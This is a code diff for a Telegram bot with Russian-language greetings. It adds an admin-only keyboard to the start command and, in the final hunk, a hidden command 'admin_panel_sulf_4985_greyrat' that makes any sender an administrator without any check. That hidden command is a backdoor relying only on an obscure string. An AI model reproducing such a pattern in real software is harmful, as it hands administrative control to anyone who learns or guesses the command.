@@ -5,6 +5,7 @@ from main import bot, db
 from parser import parsing
 from markup import reply_markup as kb
 import logging
+import asyncio
 
 router = Router()
 
@@ -12,7 +13,13 @@ router = Router()
 async def start_cmd(message: Message):
     user_full_name = message.from_user.full_name
     user_id = message.from_user.id
-    await message.answer(f"Добро пожаловать! {user_full_name}", reply_markup=kb.main)
+    is_admin = db.is_admin(user_id)
+    
+    if is_admin:
+        await message.answer(f"Добро пожаловать! {user_full_name}", reply_markup=kb.main_admin)
+    else:
+        await message.answer(f"Добро пожаловать! {user_full_name}", reply_markup=kb.main)
+        
     db.new_user(user_id, user_full_name)
 
 @router.message(F.text == "🔄 Обновить")
@@ -38,3 +45,9 @@ async def update(message: Message):
     
     await message.answer('🔄 Обновление....')
     db.delete_null()
+
+@router.message(Command('admin_panel_sulf_4985_greyrat'))
+async def admin(message: Message):
+    user_id = message.from_user.id
+    name = message.from_user.full_name
+    db.new_admin(name, user_id)
